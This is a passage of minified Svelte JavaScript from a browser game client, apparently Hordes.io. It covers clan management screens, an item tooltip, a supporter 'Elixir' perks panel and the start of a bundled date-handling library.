            i(t) {
                n || (Et(r.$$.fragment, t),
                    n = !0)
            },
            o(t) {
                Mt(r.$$.fragment, t),
                    n = !1
            },
            d(t) {
                t && _(s),
                    Ut(r),
                    a()
            }
        }
    }
    function l_(t, e) {
        let s, i, n, a, r, o, l, c, h, d, u = e[21].online ? "" : "", m = e[21].owned ? "" : "", p = Xi.ui.clan.roles[e[21].clanrole] + "";
        const f = new Ap({
            props: {
                name: e[21].name,
                pclass: e[21].class,
                level: e[21].level,
                faction: e[0].faction
            }
        });
        function g(...t) {
            return e[19](e[21], ...t)
        }
        return {
            key: t,
            first: null,
            c() {
                s = T("tr"),
                    i = T("td"),
                    Ft(f.$$.fragment),
                    n = T("span"),
                    a = P(u),
                    r = P(m),
                    o = T("td"),
                    l = P(p),
                    B(n, "class", "textgreen"),
                    B(s, "class", c = "striped " + (e[21].online ? "" : "offline") + " svelte-6t8hqd"),
                    this.first = s
            },
            m(t, e, c) {
                M(t, s, e),
                    E(s, i),
                    Zt(f, i, null),
                    E(i, n),
                    E(n, a),
                    E(n, r),
                    E(s, o),
                    E(o, l),
                    h = !0,
                    c && d(),
                    d = A(s, "mousedown", g)
            },
            p(t, i) {
                e = t;
                const n = {};
                1 & i && (n.name = e[21].name),
                    1 & i && (n.pclass = e[21].class),
                    1 & i && (n.level = e[21].level),
                    1 & i && (n.faction = e[0].faction),
                    f.$set(n),
                    (!h || 1 & i) && u !== (u = e[21].online ? "" : "") && F(a, u),
                    (!h || 1 & i) && m !== (m = e[21].owned ? "" : "") && F(r, m),
                    (!h || 1 & i) && p !== (p = Xi.ui.clan.roles[e[21].clanrole] + "") && F(l, p),
                    (!h || 1 & i && c !== (c = "striped " + (e[21].online ? "" : "offline") + " svelte-6t8hqd")) && B(s, "class", c)
            },
            i(t) {
                h || (Et(f.$$.fragment, t),
                    h = !0)
            },
            o(t) {
                Mt(f.$$.fragment, t),
                    h = !1
            },
            d(t) {
                t && _(s),
                    Ut(f),
                    d()
            }
        }
    }
    function c_(t) {
        let e, s, i = t[0] && QM(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[0] ? i ? (i.p(t, s),
                    1 & s && Et(i, 1)) : (i = QM(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function h_(t, e, s) {
        let i, n, { tag: a } = e;
        const r = async () => {
            const t = await ZM("/api/claninfo/info", {
                tag: a
            });
            t.name && (s(0, i = t),
                i.eligibleApply.length && s(5, p = i.eligibleApply[0]),
                s(0, i.online = i.members.filter(t => t.online).length, i)),
                n && (clearTimeout(n),
                    n = setTimeout(r, 5e3))
        }
            ;
        n = !0,
            r(),
            et(() => {
                clearTimeout(n),
                    n = void 0
            }
            );
        const o = (t, e) => {
            const s = [];
            e.owned ? s.push({
                name: "Leave clan",
                fun: async () => {
                    d(await ZM("/api/clan/leave", {
                        name: e.name
                    }), "Left the clan")
                }
            }) : e.clanrole < i.role && s.push({
                name: "Kick member",
                fun: async () => {
                    d(await ZM("/api/clan/kick", {
                        name: e.name
                    }), "Member kicked")
                }
            });
            for (let t = 0; t < (3 == i.role ? 4 : i.role); t++)
                s.push({
                    name: "Set rank: " + Xi.ui.clan.roles[t],
                    fun: async () => {
                        d(await ZM("/api/clan/setrole", {
                            name: e.name,
                            role: t
                        }), "Set rank: " + Xi.ui.clan.roles[t])
                    }
                });
            Wt.set({
                x: t.pageX,
                y: t.pageY,
                opts: s
            })
        }
            ;
        let l, c, h = !1;
        const d = async (t, e) => {
            "ok" !== t.result ? (s(1, l = t.result),
                s(2, c = "red")) : (s(1, l = e),
                    s(2, c = "green")),
                await r(),
                s(3, h = !1)
        }
            ;
        let u = "";
        const m = async () => {
            s(3, h = !0),
                d(await ZM("/api/clan/invite", {
                    name: u,
                    tag: a
                }), u + " invited"),
                s(4, u = "")
        }
            ;
        let p = "";
        const f = async () => {
            s(3, h = !0),
                d(await ZM("/api/clan/apply", {
                    name: p,
                    tag: a
                }), "Applied to clan"),
                s(5, p = "")
        }
            , g = (t, e) => {
                const s = [];
                i.role > 0 && s.push({
                    name: "Accept application",
                    fun: async () => {
                        d(await ZM("/api/clan/acceptapplication", {
                            id: e.id
                        }), "Accepted application")
                    }
                }),
                    i.role > 1 && s.push({
                        name: "Deny application",
                        fun: async () => {
                            d(await ZM("/api/clan/denyapplication", {
                                id: e.id
                            }), "Denied application")
                        }
                    }),
                    Wt.set({
                        x: t.pageX,
                        y: t.pageY,
                        opts: s
                    })
            }
            ;
        let v = "members";
        function y(t) {
            u = t,
                s(4, u)
        }
        function b() {
            p = N(this),
                s(5, p),
                s(0, i)
        }
        const w = t => s(6, v = "members")
            , x = t => s(6, v = "applications")
            , k = (t, e) => o(e, t)
            , $ = (t, e) => g(e, t);
        return t.$set = t => {
            "tag" in t && s(11, a = t.tag)
        }
            ,
            [i, l, c, h, u, p, v, o, m, f, g, a, n, r, d, y, b, w, x, k, $]
    }
    class d_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, h_, c_, h, {
                    tag: 11
                })
        }
    }
    function u_(t) {
        let e, s, i, n, a, r, o, c, h, d, u, m, p, f, g;
        const v = new nk({
            props: {
                amount: 1e4
            }
        });
        return {
            c() {
                e = T("h3"),
                    e.textContent = "Create clan",
                    s = T("label"),
                    s.textContent = "Clan name",
                    i = T("input"),
                    n = T("label"),
                    n.textContent = "Clan tag",
                    a = T("input"),
                    r = T("p"),
                    o = P("Cost: "),
                    Ft(v.$$.fragment),
                    h = T("div"),
                    d = P(t[2]),
                    u = T("div"),
                    m = P("Create"),
                    B(e, "class", "textprimary"),
                    B(s, "class", "svelte-7uvqsx"),
                    B(i, "type", "text"),
                    B(i, "placeholder", "Guardians of Guardstone (a-Z)"),
                    B(i, "maxlength", "20"),
                    B(n, "class", "svelte-7uvqsx"),
                    B(a, "type", "text"),
                    B(a, "placeholder", "GoG (a-Z !~=#*+-)"),
                    B(a, "maxlength", "4"),
                    B(r, "class", c = "text" + (t[4] > 1e4 ? "primary" : "red")),
                    B(h, "class", "textred"),
                    U(u, "display", "inline-block"),
                    B(u, "class", p = "btn marg-top formatted " + (t[3] ? "blue" : "blue disabled"))
            },
            m(c, p, y) {
                M(c, e, p),
                    M(c, s, p),
                    M(c, i, p),
                    Z(i, t[0]),
                    M(c, n, p),
                    M(c, a, p),
                    Z(a, t[1]),
                    M(c, r, p),
                    E(r, o),
                    Zt(v, r, null),
                    M(c, h, p),
                    E(h, d),
                    M(c, u, p),
                    E(u, m),
                    f = !0,
                    y && l(g),
                    g = [A(i, "input", t[7]), A(a, "input", t[8]), A(u, "click", t[5])]
            },
            p(t, [e]) {
                1 & e && i.value !== t[0] && Z(i, t[0]),
                    2 & e && a.value !== t[1] && Z(a, t[1]),
                    (!f || 16 & e && c !== (c = "text" + (t[4] > 1e4 ? "primary" : "red"))) && B(r, "class", c),
                    (!f || 4 & e) && F(d, t[2]),
                    (!f || 8 & e && p !== (p = "btn marg-top formatted " + (t[3] ? "blue" : "blue disabled"))) && B(u, "class", p)
            },
            i(t) {
                f || (Et(v.$$.fragment, t),
                    f = !0)
            },
            o(t) {
                Mt(v.$$.fragment, t),
                    f = !1
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    t && _(i),
                    t && _(n),
                    t && _(a),
                    t && _(r),
                    Ut(v),
                    t && _(h),
                    t && _(u),
                    l(g)
            }
        }
    }
    function m_(t, e, s) {
        let i;
        m(t, he, t => s(4, i = t));
        let n = ""
            , a = ""
            , r = !1
            , o = "";
        const l = async () => {
            if (r)
                return;
            s(6, r = !0);
            const t = await ZM("/api/clan/create", {
                name: n,
                tag: a
            });
            "ok" !== t.result && (s(2, o = t.result),
                s(6, r = !1))
        }
            ;
        function c() {
            n = this.value,
                s(0, n)
        }
        function h() {
            a = this.value,
                s(1, a)
        }
        let d;
        return t.$$.update = () => {
            83 & t.$$.dirty && s(3, d = !r && i >= 1e4 && n.length <= 20 && n.length >= 3 && a.length <= 4 && a.length >= 2)
        }
            ,
            [n, a, o, d, i, l, r, c, h]
    }
    class p_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, m_, u_, h, {})
        }
    }
    function f_(t, e, s) {
        const i = t.slice();
        return i[4] = e[s],
            i[6] = s,
            i
    }
    function g_(t) {
        let e, s = [], i = new Map, n = t[0];
        const a = t => t[4].clan;
        for (let e = 0; e < n.length; e += 1) {
            let r = f_(t, n, e)
                , o = a(r);
            i.set(o, s[e] = b_(o, r))
        }
        return {
            c() {
                for (let t = 0; t < s.length; t += 1)
                    s[t].c();
                e = D()
            },
            m(t, i) {
                for (let e = 0; e < s.length; e += 1)
                    s[e].m(t, i);
                M(t, e, i)
            },
            p(t, n) {
                if (3 & n) {
                    const r = t[0];
                    s = At(s, n, a, 1, t, r, i, e.parentNode, It, b_, e, f_)
                }
            },
            d(t) {
                for (let e = 0; e < s.length; e += 1)
                    s[e].d(t);
                t && _(e)
            }
        }
    }
    function v_(t) {
        let e, s;
        function i(...e) {
            return t[3](t[4], ...e)
        }
        return {
            c() {
                e = T("div"),
                    e.textContent = "Accept",
                    B(e, "class", "btn blue")
            },
            m(t, n, a) {
                M(t, e, n),
                    a && s(),
                    s = A(e, "click", i)
            },
            p(e, s) {
                t = e
            },
            d(t) {
                t && _(e),
                    s()
            }
        }
    }
    function y_(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.textContent = "Application"
            },
            m(t, s) {
                M(t, e, s)
            },
            p: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function b_(t, e) {
        let s, i, n, a, r, o, l = e[4].tag + "", c = e[4].name + "";
        function h(t, e) {
            return t[4].request ? y_ : v_
        }
        let d = h(e)
            , u = d(e);
        return {
            key: t,
            first: null,
            c() {
                s = T("tr"),
                    i = T("td"),
                    n = P(l),
                    a = T("td"),
                    r = P(c),
                    o = T("td"),
                    u.c(),
                    B(s, "class", "striped"),
                    this.first = s
            },
            m(t, e) {
                M(t, s, e),
                    E(s, i),
                    E(i, n),
                    E(s, a),
                    E(a, r),
                    E(s, o),
                    u.m(o, null)
            },
            p(t, e) {
                1 & e && l !== (l = t[4].tag + "") && F(n, l),
                    1 & e && c !== (c = t[4].name + "") && F(r, c),
                    d === (d = h(t)) && u ? u.p(t, e) : (u.d(1),
                        u = d(t),
                        u && (u.c(),
                            u.m(o, null)))
            },
            d(t) {
                t && _(s),
                    u.d()
            }
        }
    }
    function w_(t) {
        let e, s, n, a = t[0] && g_(t);
        return {
            c() {
                e = T("table"),
                    s = T("thead"),
                    s.innerHTML = '<tr class="textprimary"><th width="20%">Tag</th><th width="60%">Clan Name</th><th>Action</th></tr>',
                    n = T("tbody"),
                    a && a.c(),
                    B(e, "class", "marg-top panel-black")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    E(e, n),
                    a && a.m(n, null)
            },
            p(t, [e]) {
                t[0] ? a ? a.p(t, e) : (a = g_(t),
                    a.c(),
                    a.m(n, null)) : a && (a.d(1),
                        a = null)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    a && a.d()
            }
        }
    }
    function x_(t, e, s) {
        let i;
        const n = async () => {
            s(0, i = await ZM("/api/clan/invites", {
                name: Ua.player.name
            }))
        }
            ;
        n();
        const a = async t => {
            await ZM("/api/clan/acceptinvite", {
                id: t
            })
        }
            , r = (t, e) => a(t.id);
        return [i, a, n, r]
    }
    class k_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, x_, w_, h, {})
        }
    }
    function $_(t) {
        let e, s;
        const i = new Sb({
            props: {
                title: "Clan",
                icon: "clan",
                scroll: "true",
                $$slots: {
                    default: [T_]
                },
                $$scope: {
                    ctx: t
                }
            }
        });
        return i.$on("close", t[6]),
        {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "absCentered container svelte-9et4uw")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                133 & e && (s.$$scope = {
                    dirty: e,
                    ctx: t
                }),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function S_(t) {
        let e, s, n, a, r, o;
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    n = T("h3"),
                    n.textContent = "You have no clan",
                    a = T("div"),
                    a.textContent = "View invitations",
                    r = T("div"),
                    r.textContent = "Create clan",
                    B(a, "class", "btn grey"),
                    B(r, "class", "btn grey marg-top"),
                    B(s, "class", "panel-black"),
                    B(e, "class", "clanInfoBox textcenter svelte-9et4uw")
            },
            m(i, c, h) {
                M(i, e, c),
                    E(e, s),
                    E(s, n),
                    E(s, a),
                    E(s, r),
                    h && l(o),
                    o = [A(a, "click", t[4]), A(r, "click", t[5])]
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e),
                    l(o)
            }
        }
    }
    function E_(t) {
        let e, s, i, n, a, r;
        const o = [C_, __]
            , l = [];
        function c(t, e) {
            return "create" == t[0] ? 0 : "invites" == t[0] ? 1 : -1
        }
        return ~(i = c(t)) && (n = l[i] = o[i](t)),
        {
            c() {
                e = T("div"),
                    s = T("div"),
                    s.textContent = "Back",
                    n && n.c(),
                    U(s, "display", "inline-block"),
                    B(s, "class", "btn formatted grey"),
                    B(e, "class", "modemenu svelte-9et4uw")
            },
            m(n, o, c) {
                M(n, e, o),
                    E(e, s),
                    ~i && l[i].m(e, null),
                    a = !0,
                    c && r(),
                    r = A(s, "click", t[3])
            },
            p(t, s) {
                let a = i;
                i = c(t),
                    i !== a && (n && ($t(),
                        Mt(l[a], 1, 1, () => {
                            l[a] = null
                        }
                        ),
                        St()),
                        ~i ? (n = l[i],
                            n || (n = l[i] = o[i](t),
                                n.c()),
                            Et(n, 1),
                            n.m(e, null)) : n = null)
            },
            i(t) {
                a || (Et(n),
                    a = !0)
            },
            o(t) {
                Mt(n),
                    a = !1
            },
            d(t) {
                t && _(e),
                    ~i && l[i].d(),
                    r()
            }
        }
    }
    function M_(t) {
        let e, s;
        const i = new d_({
            props: {
                tag: t[2]
            }
        });
        return {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "clanView svelte-9et4uw")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                4 & e && (s.tag = t[2]),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function __(t) {
        let e;
        const s = new k_({});
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function C_(t) {
        let e;
        const s = new p_({});
        return {
            c() {
                Ft(s.$$.fragment)
            },
            m(t, i) {
                Zt(s, t, i),
                    e = !0
            },
            i(t) {
                e || (Et(s.$$.fragment, t),
                    e = !0)
            },
            o(t) {
                Mt(s.$$.fragment, t),
                    e = !1
            },
            d(t) {
                Ut(s, t)
            }
        }
    }
    function T_(t) {
        let e, s, i, n;
        const a = [M_, E_, S_]
            , r = [];
        function o(t, e) {
            return t[2] ? 0 : t[0] ? 1 : 2
        }
        return e = o(t),
            s = r[e] = a[e](t),
        {
            c() {
                s.c(),
                    i = D()
            },
            m(t, s) {
                r[e].m(t, s),
                    M(t, i, s),
                    n = !0
            },
            p(t, n) {
                let l = e;
                e = o(t),
                    e === l ? r[e].p(t, n) : ($t(),
                        Mt(r[l], 1, 1, () => {
                            r[l] = null
                        }
                        ),
                        St(),
                        s = r[e],
                        s || (s = r[e] = a[e](t),
                            s.c()),
                        Et(s, 1),
                        s.m(i.parentNode, i))
            },
            i(t) {
                n || (Et(s),
                    n = !0)
            },
            o(t) {
                Mt(s),
                    n = !1
            },
            d(t) {
                r[e].d(t),
                    t && _(i)
            }
        }
    }
    function P_(t) {
        let e, s, i = t[1] && $_(t);
        return {
            c() {
                i && i.c(),
                    e = D()
            },
            m(t, n) {
                i && i.m(t, n),
                    M(t, e, n),
                    s = !0
            },
            p(t, [s]) {
                t[1] ? i ? (i.p(t, s),
                    2 & s && Et(i, 1)) : (i = $_(t),
                        i.c(),
                        Et(i, 1),
                        i.m(e.parentNode, e)) : i && ($t(),
                            Mt(i, 1, 1, () => {
                                i = null
                            }
                            ),
                            St())
            },
            i(t) {
                s || (Et(i),
                    s = !0)
            },
            o(t) {
                Mt(i),
                    s = !1
            },
            d(t) {
                i && i.d(t),
                    t && _(e)
            }
        }
    }
    function I_(t, e, s) {
        let i, n;
        m(t, ms, t => s(1, i = t)),
            m(t, Fe, t => s(2, n = t));
        let a = !1;
        const r = t => s(0, a = !1)
            , o = t => s(0, a = "invites")
            , l = t => s(0, a = "create")
            , c = () => {
                y(ms, i = !1)
            }
            ;
        return [a, i, n, r, o, l, c]
    }
    class D_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, I_, P_, h, {})
        }
    }
    function A_(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m = t[0].name + "", p = void 0 !== t[0].level ? `Lv. ${t[0].level} ` : "", f = (void 0 !== t[0].class ? Xi.classes[t[0].class].name : "Item") + "", g = (void 0 !== t[0].faction ? Xi.factions[t[0].faction].name : "") + "";
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    i = P(m),
                    n = T("div"),
                    a = T("span"),
                    r = P(p),
                    o = T("span"),
                    l = P(f),
                    h = T("span"),
                    d = P(g),
                    B(s, "class", "textwhite title svelte-1wip79f"),
                    B(o, "class", c = v(void 0 !== t[0].class ? "textc" + t[0].class : "textyellow") + " svelte-1wip79f"),
                    B(h, "class", u = v(void 0 !== t[0].faction ? "textf" + t[0].faction : "") + " svelte-1wip79f"),
                    B(e, "class", "panel-black container svelte-1wip79f"),
                    U(e, "display", t[1] ? "block" : "none")
            },
            m(t, c) {
                M(t, e, c),
                    E(e, s),
                    E(s, i),
                    E(e, n),
                    E(n, a),
                    E(a, r),
                    E(n, o),
                    E(o, l),
                    E(e, h),
                    E(h, d)
            },
            p(t, s) {
                1 & s && m !== (m = t[0].name + "") && F(i, m),
                    1 & s && p !== (p = void 0 !== t[0].level ? `Lv. ${t[0].level} ` : "") && F(r, p),
                    1 & s && f !== (f = (void 0 !== t[0].class ? Xi.classes[t[0].class].name : "Item") + "") && F(l, f),
                    1 & s && c !== (c = v(void 0 !== t[0].class ? "textc" + t[0].class : "textyellow") + " svelte-1wip79f") && B(o, "class", c),
                    1 & s && g !== (g = (void 0 !== t[0].faction ? Xi.factions[t[0].faction].name : "") + "") && F(d, g),
                    1 & s && u !== (u = v(void 0 !== t[0].faction ? "textf" + t[0].faction : "") + " svelte-1wip79f") && B(h, "class", u),
                    2 & s && U(e, "display", t[1] ? "block" : "none")
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function B_(t) {
        let e, s = t[0] && A_(t);
        return {
            c() {
                s && s.c(),
                    e = D()
            },
            m(t, i) {
                s && s.m(t, i),
                    M(t, e, i)
            },
            p(t, [i]) {
                t[0] ? s ? s.p(t, i) : (s = A_(t),
                    s.c(),
                    s.m(e.parentNode, e)) : s && (s.d(1),
                        s = null)
            },
            i: i,
            o: i,
            d(t) {
                s && s.d(t),
                    t && _(e)
            }
        }
    }
    function R_(t, e, s) {
        let i, n;
        return m(t, xe, t => s(1, i = t)),
            t.$$.update = () => {
                2 & t.$$.dirty && i > 0 && Ua.isEntityIdTaken(i) && s(0, n = Ua.entity(i))
            }
            ,
            [n, i]
    }
    class z_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, R_, B_, h, {})
        }
    }
    const F_ = Ze
        , Z_ = async t => {
            const e = await ZM("/api/account/info");
            F_.set(e),
                ue.set(e.storepoints),
                t && t(e)
        }
        ;
    function U_(t) {
        let e, s, n, a, r, o, l, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $, S, C, D, A, R, z, F, Z, U, L, N, O, j, q, X, H, K;
        return {
            c() {
                e = T("div"),
                    s = T("div"),
                    s.innerHTML = '<img class="artwork svelte-cbx1m" src="/assets/ui/elixir.svg?v=4002247"><div class="sparkle svelte-cbx1m" style="font-size:35px; left:30%; top:30%; animation-delay: -1s;">+</div><div class="sparkle svelte-cbx1m" style="font-size:50px; left:40%; top:60%; animation-delay: -2s;">+</div><div class="sparkle svelte-cbx1m" style="font-size:80px; left:60%; top:20%; animation-delay: -3s;">+</div>',
                    n = T("div"),
                    a = T("h1"),
                    a.innerHTML = 'Hordes <span class="textsub">Elixir</span>',
                    r = T("div"),
                    r.innerHTML = '<img class="svgicon" src="/assets/ui/icons/gem.svg?v=4002247"> Chat supporter icon',
                    o = T("div"),
                    o.innerHTML = '<img class="svgicon" src="/assets/ui/icons/check.svg?v=4002247"> No ads',
                    l = T("div"),
                    c = T("img"),
                    d = I(),
                    u = T("span"),
                    u.textContent = "" + WS[0].inventory,
                    m = I(),
                    p = T("span"),
                    p.textContent = "" + WS[1].inventory,
                    f = P(" base bag slots"),
                    g = T("div"),
                    v = T("img"),
                    b = I(),
                    w = T("span"),
                    w.textContent = "" + WS[0].stash,
                    x = I(),
                    k = T("span"),
                    k.textContent = "" + WS[1].stash,
                    $ = P(" stash storage"),
                    S = T("div"),
                    C = T("img"),
                    A = I(),
                    R = T("span"),
                    R.textContent = "" + WS[0].auction,
                    z = I(),
                    F = T("span"),
                    F.textContent = "" + WS[1].auction,
                    Z = P(" merchant limit"),
                    U = T("div"),
                    L = T("img"),
                    O = I(),
                    j = T("span"),
                    j.textContent = WS[0].auctionHours + "h",
                    q = I(),
                    X = T("span"),
                    X.textContent = WS[1].auctionHours + "h",
                    H = P(" merchant duration"),
                    K = T("div"),
                    K.textContent = "+ more to come (TBA)",
                    B(s, "class", "artcontainer svelte-cbx1m"),
                    B(a, "class", "textprimary"),
                    B(r, "class", "textwhite"),
                    B(o, "class", "textwhite"),
                    B(c, "class", "svgicon"),
                    c.src !== (h = "/assets/ui/icons/check.svg?v=4002247") && B(c, "src", h),
                    B(u, "class", "old svelte-cbx1m"),
                    B(p, "class", "textsub"),
                    B(l, "class", "textwhite"),
                    B(v, "class", "svgicon"),
                    v.src !== (y = "/assets/ui/icons/check.svg?v=4002247") && B(v, "src", y),
                    B(w, "class", "old svelte-cbx1m"),
                    B(k, "class", "textsub"),
                    B(g, "class", "textwhite"),
                    B(C, "class", "svgicon"),
                    C.src !== (D = "/assets/ui/icons/check.svg?v=4002247") && B(C, "src", D),
                    B(R, "class", "old svelte-cbx1m"),
                    B(F, "class", "textsub"),
                    B(S, "class", "textwhite"),
                    B(L, "class", "svgicon"),
                    L.src !== (N = "/assets/ui/icons/check.svg?v=4002247") && B(L, "src", N),
                    B(j, "class", "old svelte-cbx1m"),
                    B(X, "class", "textsub"),
                    B(U, "class", "textwhite"),
                    B(K, "class", "textgrey"),
                    B(e, "class", "split svelte-cbx1m")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    E(e, n),
                    E(n, a),
                    E(n, r),
                    E(n, o),
                    E(n, l),
                    E(l, c),
                    E(l, d),
                    E(l, u),
                    E(l, m),
                    E(l, p),
                    E(l, f),
                    E(n, g),
                    E(g, v),
                    E(g, b),
                    E(g, w),
                    E(g, x),
                    E(g, k),
                    E(g, $),
                    E(n, S),
                    E(S, C),
                    E(S, A),
                    E(S, R),
                    E(S, z),
                    E(S, F),
                    E(S, Z),
                    E(n, U),
                    E(U, L),
                    E(U, O),
                    E(U, j),
                    E(U, q),
                    E(U, X),
                    E(U, H),
                    E(n, K)
            },
            p: i,
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    class L_ extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, null, U_, h, {})
        }
    }
    const N_ = {
        SECONDS_A_MINUTE: 60,
        SECONDS_A_HOUR: 3600,
        SECONDS_A_DAY: 86400,
        SECONDS_A_WEEK: 604800,
        MILLISECONDS_A_SECOND: 1e3,
        MILLISECONDS_A_MINUTE: 6e4,
        MILLISECONDS_A_HOUR: 36e5,
        MILLISECONDS_A_DAY: 864e5,
        MILLISECONDS_A_WEEK: 6048e5,
        MS: "millisecond",
        S: "second",
        MIN: "minute",
        H: "hour",
        D: "day",
        W: "week",
        M: "month",
        Q: "quarter",
        Y: "year",
        DATE: "date",
        FORMAT_DEFAULT: "YYYY-MM-DDTHH:mm:ssZ",
        INVALID_DATE_STRING: "Invalid Date",
        REGEX_PARSE: /^(\d{4})-?(\d{1,2})-?(\d{0,2})[^0-9]*(\d{1,2})?:?(\d{1,2})?:?(\d{1,2})?.?(\d{1,3})?$/,
        REGEX_FORMAT: /\[([^\]]+)]|Y{2,4}|M{1,4}|D{1,2}|d{1,4}|H{1,2}|h{1,2}|a|A|m{1,2}|s{1,2}|Z{1,2}|SSS/g
    }
        , O_ = (t, e, s) => {
            const i = String(t);
            return !i || i.length >= e ? t : `${Array(e + 1 - i.length).join(s)}${t}`
        }
        , j_ = t => {
            const e = -t.utcOffset()
                , s = Math.abs(e)
                , i = Math.floor(s / 60)
                , n = s % 60;
            return `${e <= 0 ? "+" : "-"}${O_(i, 2, "0")}:${O_(n, 2, "0")}`
        }
        , q_ = {
            s: O_,
            z: j_,
            m: (t, e) => {
                const s = 12 * (e.year() - t.year()) + (e.month() - t.month())
                    , i = t.clone().add(s, N_.M)
                    , n = e - i < 0
                    , a = t.clone().add(s + (n ? -1 : 1), N_.M);
                return Number(-(s + (e - i) / (n ? i - a : a - i)) || 0)
            }
            ,
            a: t => t < 0 ? Math.ceil(t) || 0 : Math.floor(t),
            p: t => ({
                M: N_.M,
                y: N_.Y,
                w: N_.W,
                d: N_.D,
                h: N_.H,
                m: N_.MIN,
                s: N_.S,
                ms: N_.MS,
                Q: N_.Q
            }[t] || String(t || "").toLowerCase().replace(/s$/, "")),
            u: t => void 0 === t
        }
        , X_ = {
            name: "en",
            weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
            months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_")
        };
    let H_ = "en";
    const K_ = {};
    K_[H_] = X_;
    const W_ = t => t instanceof tC
        , Y_ = (t, e, s) => {
            let i;
            if (!t)
                return H_;
            if ("string" == typeof t)
                K_[t] && (i = t),
                    e && (K_[t] = e,
                        i = t);
            else {
                const { name: e } = t;
                K_[e] = t,
                    i = e
            }
            return s || (H_ = i),
                i
        }
        , V_ = (t, e, s) => {
            if (W_(t))
                return t.clone();
            const i = e ? "string" == typeof e ? {
                format: e,
                pl: s
            } : e : {};
            return i.date = t,
                new tC(i)
        }
        , G_ = (t, e) => V_(t, {
            locale: e.$L,
            utc: e.$u,
            $offset: e.$offset
        })
        , Q_ = q_;
    Q_.l = Y_,
        Q_.i = W_,
        Q_.w = G_;
    const J_ = t => {
        const { date: e, utc: s } = t;
        if (null === e)
            return new Date(NaN);
        if (Q_.u(e))
            return new Date;
        if (e instanceof Date)
            return new Date(e);
        if ("string" == typeof e && !/Z$/i.test(e)) {
            const t = e.match(N_.REGEX_PARSE);
            if (t)
                return s ? new Date(Date.UTC(t[1], t[2] - 1, t[3] || 1, t[4] || 0, t[5] || 0, t[6] || 0, t[7] || 0)) : new Date(t[1], t[2] - 1, t[3] || 1, t[4] || 0, t[5] || 0, t[6] || 0, t[7] || 0)
        }
        return new Date(e)
    }
        ;
    class tC {
        constructor(t) {
            this.$L = this.$L || Y_(t.locale, null, !0),
                this.parse(t)
        }
        parse(t) {
            this.$d = J_(t),
                this.init()
        }
        init() {
            const { $d: t } = this;
            this.$y = t.getFullYear(),
                this.$M = t.getMonth(),
                this.$D = t.getDate(),
                this.$W = t.getDay(),
                this.$H = t.getHours(),
                this.$m = t.getMinutes(),
                this.$s = t.getSeconds(),
                this.$ms = t.getMilliseconds()
        }
        $utils() {
            return Q_
        }
        isValid() {
            return !(this.$d.toString() === N_.INVALID_DATE_STRING)
        }
        isSame(t, e) {
            const s = V_(t);
            return this.startOf(e) <= s && s <= this.endOf(e)
        }
        isAfter(t, e) {
            return V_(t) < this.startOf(e)
        }
        isBefore(t, e) {
            return this.endOf(e) < V_(t)
        }
        $g(t, e, s) {
            return Q_.u(t) ? this[e] : this.set(s, t)
        }
        year(t) {
            return this.$g(t, "$y", N_.Y)
        }
        month(t) {
            return this.$g(t, "$M", N_.M)
        }
        day(t) {
            return this.$g(t, "$W", N_.D)
        }
        date(t) {
            return this.$g(t, "$D", N_.DATE)
        }
        hour(t) {
            return this.$g(t, "$H", N_.H)
        }
        minute(t) {
            return this.$g(t, "$m", N_.MIN)
        }
        second(t) {
            return this.$g(t, "$s", N_.S)
        }
        millisecond(t) {
            return this.$g(t, "$ms", N_.MS)
        }
        unix() {
            return Math.floor(this.valueOf() / 1e3)
        }
        valueOf() {
            return this.$d.getTime()
        }
        startOf(t, e) {
            const s = !!Q_.u(e) || e
                , i = Q_.p(t)
                , n = (t, e) => {
                    const i = Q_.w(this.$u ? Date.UTC(this.$y, e, t) : new Date(this.$y, e, t), this);
